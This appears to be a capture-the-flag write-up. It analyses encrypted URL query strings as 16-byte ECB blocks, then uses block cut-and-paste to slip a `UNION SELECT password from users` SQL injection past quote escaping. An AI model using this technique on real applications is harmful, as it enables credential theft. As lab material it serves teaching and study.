G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK%2B3BthQLni68qM9OYQkTq645oGdhkgSlo%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA%2B2078pAPR3X9UET9Bj0m9rt%2Fc0tByJk%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo%2FrTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad%2BjtGqvgtdBcT%2F5qwUI6tHjrGh%2FiYaLGwVBhEJs%2F7a
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc%2BW8qVURZGUeQT0sqvywtdoaqcqUxUclw
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk%2BTeoJCUeZlbnESzUa
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiCmh%2BTDOtWa4NEQcBXdALKw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeVHYCtS%2BuFWasjpcfkfbWBUHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepFqT7keU0bYgT7CSC2jyfWSGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7aEY%2BZn5SV6PPZc%2FumUoo4lt6QiE%2BGEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe8pCcTVN4HuF3egErsaclQaCVIvMBz502rHAj8WWUjFqXOc2QUi%2BnqG%2BVdztW%2BfjA

G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo3OKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO%2FKQD0d1%2FVBE%2FQY9Jva7f3NLQciZ
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12%2FMXUZMaiIebtmORiI6FNnEKRuYd1sD%2B8c9Tt2K5R19pxsrCD2Rmg17iLmA%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo%2BzTb4%2FZFk1ANUDkSXB9J%2BVCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4%2FemDU2A%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1rvKpl9ojY%2FcqP60zLRc2%2Bnc%2FMYUJSqAUCPH5fQN9OFZ4xXc%2BzCj4cOT068bIBwpA%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4klFYz8WsBtIr%2FaC3LI8VGnfo7Rqr4LXQXE%2F%2BasFCOrR46xof4mGixsFQYRCbP%2B2g%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo634oa0Bd%2B0eytOsfBCCqp69%2BhBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1PZSZ68rWhh8Et83CTzBGJIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6VJ%2FaUrbZtOJjLbMYOIVtWaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqoyARu%2BSI3eG77JYbYXCzDhIpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4gpofkwzrVmuDREHAV3QCysO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1R2ArUvrhVmrI6XH5H21gVBwJjEus3F7ZNXVk5RBd1%2BZNDcyGglNpKt%2FL03ltG%2Fig%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6Rak%2B5HlNG2IE%2Bwkgto8n1khpVK6kb7k%2BmrhYRbT0vQ1%2F8rclRT%2FClHAeUfXXwPjg%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo%2B2hGPmZ%2BUlejz2XP7plKKOJbekIhPhhCLFn%2BLSupddjkXIyBRSD5o5Fj9BmFnswow%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo%2FKQnE1TeB7hd3oBK7GnJUGglSLzAc%2BdNqxwI%2FFllIxalznNkFIvp6hvlXc7Vvn4wA%3D%3D

G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qNzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qO07aCH08C%2Bor7cG2FAueLryoz05hCROrrjmgZ2GSBKWg%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPOgqlVO2W4EoD7bTvykA9Hdf1QRP0GPSb2u39zS0HImQ%3D%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qMfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPs02%2BP2RZNQDVA5ElwfSflQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qNa7yqZfaI2P3Kj%2BtMy0XNvp3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOJJRWM%2FFrAbSK%2F2gtyyPFRp36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOt%2BKGtAXftHsrTrHwQgqqevfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qNT2UmevK1oYfBLfNwk8wRiSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
...

```

can observed that 
from 1`a` until 9`a`, there is repeated pattern of `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP`
from 10`a` until 25`a`, there is repeated pattern of G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP`LAhy3ui8kLEVaROwiiI6Oe`
from 26`a` until 41`a`, there is repeated pattern of G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe`s5A4wo33m2XSYVHfWPfq`
from 41`a` onwards, there is a repeated pattern of G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfq`o7OQOMKN95tl0mFR31j36q`
therefore, we can identified that the 16 bytes block size is used for each pattern changes.


convert the url query collected for each attempt as input. Go to cyberchef, do the following recipe: 
1. Fork >> split delimeter: \n >> Merge delimeter" \n\n to separate each attempt with a line break, easier to be analyzed later.
2. URL Decode
3. From Base64 (not human readble, thus hard to analyze)
4. To Hex >> Delimeter: None >> Bytes per line: 16 (to make it readable)

output: 
```
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
ab880a8f136fbeb98967891324a1b075
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
b130a531bec89c705213bfa5c9667ac7
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
2f5293a63acb9fe8c7b4e824b76d6a1d
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
3504a9a9675ffd614b4f1f90d284fcaa
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c36a1f0469158a3052166146a5e3f2ec
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
4a11ffe73afd15daa05eb3c3486dcde1
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
9fde1cef6e3f84a172633f3074fc8e18
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
453e0020602f4dccd50f0eb7709477c2
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
9e622686a52640595706099abcb052bb
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
a549fda52b6d9b4e2632db31838856d5
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
2011bbe488dde1bbec961b6170b30e12
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
8829a1f930ceb566b834441c0577402c
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
547602b52fae1566ac8e971f91f6d605
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
a45a93ee4794d1b6204fb0920b68f27d
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
eda118f999f9495e8f3d973fba6528a3
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
f2909c4d53781ee1777a012bb1a72541
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
a549fda52b6d9b4e2632db31838856d5
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
2011bbe488dde1bbec961b6170b30e12
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
8829a1f930ceb566b834441c0577402c
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
547602b52fae1566ac8e971f91f6d605
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
a45a93ee4794d1b6204fb0920b68f27d
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
eda118f999f9495e8f3d973fba6528a3
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
f2909c4d53781ee1777a012bb1a72541
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
b39038c28df79b65d26151df58f7eaa3
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57

```
from the observation, can identify that 
from 1`a` until 9`a`, the first 2 lines are fixed
from 10`a` until 25`a`, the first 3 lines are fixed
from 26`a` until 41`a`, the first 4 lines are fixed
from 41`a` onwards, the first 5 lines are fixed


take the example for 10`a`, 11`a` and 12`a`: 
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
b4eda087d3c0bea2bedc1b6140b9e2eb    a
ca8cf4e610913abae39a067619204a5a

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
ce82a9553b65b81280fb6d3bf2900f47    aa
75fd5044fd063d26f6bb7f734b41c899


### Approach 
to exploit this, can use the payload `aaaaaaaaa' UNION SELECT password from users;#`.
the payload is using 9`a` because the " in the input will be treated as \" for input validation. Thus, one place for `a` need to be reserved for `\`. 

after we input the payload, the query obtained is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIR27gK4CQl3Jcmv%2F0YAxYOWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D`
then, transform into the hex format.
```
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
11dbb80ae02425dc9726bffd1803160e    XXXXXXaaaaaaaaa\
5a73dc8bfa8ab5ed288514e439b17e4f    ' UNION SELECT ....
86951754f7ad56454eb5d5b6768ee646
319b9c6dcacb763bd559feccd0293533
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8    .... users;#
```

to exploit this, we can change the 3rd line to the 10`a` format, so that it become: 
```
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
5a73dc8bfa8ab5ed288514e439b17e4f    ' UNION SELECT ....
86951754f7ad56454eb5d5b6768ee646
319b9c6dcacb763bd559feccd0293533
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8    .... users;#
```
